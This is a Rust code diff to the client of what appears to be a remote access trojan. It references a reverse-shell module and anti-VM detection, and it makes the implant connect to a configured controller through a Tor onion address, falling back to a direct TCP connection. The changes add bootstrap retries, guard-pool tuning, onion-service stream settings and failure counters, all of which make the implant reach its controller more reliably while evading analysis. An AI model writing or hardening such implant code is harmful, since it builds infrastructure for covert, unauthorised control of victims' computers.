@@ -13,8 +13,10 @@ pub mod service;
 pub mod handler;
 
 use tokio::{net::TcpStream, sync::oneshot, time::sleep};
-use arti_client::{TorClient, TorClientConfig};
+use arti_client::{TorClient, TorClientConfig, StreamPrefs};
+use arti_client::config::BoolOrAuto;
 use common::{connection::Connection, connection::StreamTrait, packets::*};
+use futures::StreamExt;
 
 use std::sync::{Arc, Mutex};
 use once_cell::sync::Lazy;
@@ -29,8 +31,21 @@ static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy:
     Mutex::new(features::reverse_shell::ReverseShell::new())
 );
 
-#[tokio::main(flavor = "current_thread")]
+#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
 async fn main() {
+    // Log arti's internal tracing events (circuit building, bootstrap, HSDir fetches, etc.)
+    // to stdout.  Filter: show arti/tor crates at DEBUG, everything else at WARN.
+    tracing_subscriber::fmt()
+        .with_env_filter(
+            tracing_subscriber::EnvFilter::new(
+                "warn,arti_client=debug,tor_circmgr=debug,tor_dirmgr=debug,tor_hsdir=debug,tor_proto=debug"
+            )
+        )
+        .with_target(true)
+        .with_thread_ids(false)
+        .with_file(false)
+        .init();
+
     let config = service::config::get_config();
 
     if config.anti_vm_detection && service::anti_vm::anti_vm_detection() {
@@ -62,14 +77,61 @@ async fn main() {
 
     let tor_client = if config.use_tor {
         println!("Initializing Tor client...");
-        let tor_config = TorClientConfig::default();
-        match TorClient::create_bootstrapped(tor_config).await {
-            Ok(client) => Some(client),
-            Err(e) => {
-                eprintln!("Failed to create Tor client: {}. Falling back to direct connection or retrying.", e);
-                None
+        let mut tor_config_builder = TorClientConfig::builder();
+        // Increase the primary guard pool so arti has more candidates when
+        // some guards are unreachable.  The default of 3 means a single bad
+        // guard stalls all onion circuit builds for 30 seconds at a time.
+        tor_config_builder.override_net_params().insert("guard-n-primary-guards".to_string(), 6);
+        tor_config_builder.override_net_params().insert("guard-n-primary-guards-to-use-if-max-filtered".to_string(), 6);
+        let tor_config = tor_config_builder.build().expect("Failed to build TorClientConfig");
+
+        // Retry bootstrap indefinitely — a single failure (e.g. clock skew, cold
+        // consensus cache) should not permanently disable Tor for this session.
+        let client = loop {
+            match TorClient::builder()
+                .config(tor_config.clone())
+                .create_unbootstrapped()
+            {
+                Ok(unbootstrapped) => {
+                    // Stream bootstrap progress to console in a background task.
+                    // bootstrap_events() returns a stream that doesn't consume the client.
+                    let mut events = unbootstrapped.bootstrap_events();
+                    tokio::spawn(async move {
+                        while let Some(status) = events.next().await {
+                            println!(
+                                "[Tor bootstrap] {:.0}% — {:?}",
+                                status.as_frac() * 100.0,
+                                status
+                            );
+                        }
+                    });
+
+                    match unbootstrapped.bootstrap().await {
+                        Ok(()) => {
+                            println!("[Tor] Bootstrap complete.");
+                            break unbootstrapped;
+                        }
+                        Err(e) => {
+                            eprintln!("[Tor] Bootstrap failed: {}. Retrying in 15 seconds...", e);
+                            sleep(Duration::from_secs(15)).await;
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[Tor] Failed to create client: {}. Retrying in 15 seconds...", e);
+                    sleep(Duration::from_secs(15)).await;
+                }
             }
-        }
+        };
+
+        // Give arti time to build its onion-service circuit pool after bootstrap.
+        // Bootstrap completing only guarantees clearnet reachability; the hspool
+        // needs additional time to build NAIVE/GUARDED circuits for .onion targets.
+        // The server logs show this typically takes 30-60 seconds.
+        println!("[Tor] Waiting 30 seconds for onion circuit pool to warm up...");
+        sleep(Duration::from_secs(30)).await;
+
+        Some(client)
     } else {
         None
     };
@@ -87,14 +149,42 @@ async fn main() {
         let stream = if config.use_tor && tor_client.is_some() {
             let tor = tor_client.as_ref().unwrap();
             let port = config.port.parse::<u16>().unwrap_or(1337);
-            match tor.connect((config.tor_address.clone(), port)).await {
-                Ok(s) => Box::new(s) as Box<dyn StreamTrait + Unpin + Send>,
+            // Onion service connections are disabled by default in arti-client.
+            // StreamPrefs must explicitly enable them or .onion addresses will be rejected.
+            let mut prefs = StreamPrefs::new();
+            prefs.connect_to_onion_services(BoolOrAuto::Explicit(true));
+
+            // Track how many consecutive Tor failures have occurred so we know
+            // when to give up and fall back to direct TCP.
+            // The counter lives outside the loop so it persists across iterations.
+            static TOR_FAIL_COUNT: std::sync::atomic::AtomicU32 =
+                std::sync::atomic::AtomicU32::new(0);
+
+            match tor.connect_with_prefs((config.tor_address.clone(), port), &prefs).await {
+                Ok(s) => {
+                    TOR_FAIL_COUNT.store(0, std::sync::atomic::Ordering::Relaxed);
+                    Box::new(s) as Box<dyn StreamTrait + Unpin + Send>
+                }
                 Err(e) => {
-                    println!("Tor connection failed for {}:{}: {}. Falling back to direct TCP...", config.tor_address, port, e);
+                    let fails = TOR_FAIL_COUNT.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
+                    println!(
+                        "[Tor] Connection failed ({}/10) for {}:{}: {}",
+                        fails, config.tor_address, port, e
+                    );
+
+                    if fails < 10 {
+                        println!("[Tor] Retrying via Tor in 10 seconds...");
+                        sleep(Duration::from_secs(10)).await;
+                        continue;
+                    }
+
+                    // 10 consecutive Tor failures — fall back to direct TCP
+                    println!("[Tor] 10 consecutive failures. Falling back to direct TCP...");
+                    TOR_FAIL_COUNT.store(0, std::sync::atomic::Ordering::Relaxed);
                     match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
                         Ok(socket) => Box::new(socket) as Box<dyn StreamTrait + Unpin + Send>,
                         Err(e) => {
-                            println!("Direct connection failed after Tor failure: {}. Retrying in 5 seconds...", e);
+                            println!("Direct TCP fallback also failed: {}. Retrying in 5 seconds...", e);
                             sleep(Duration::from_secs(5)).await;
                             continue;
                         }
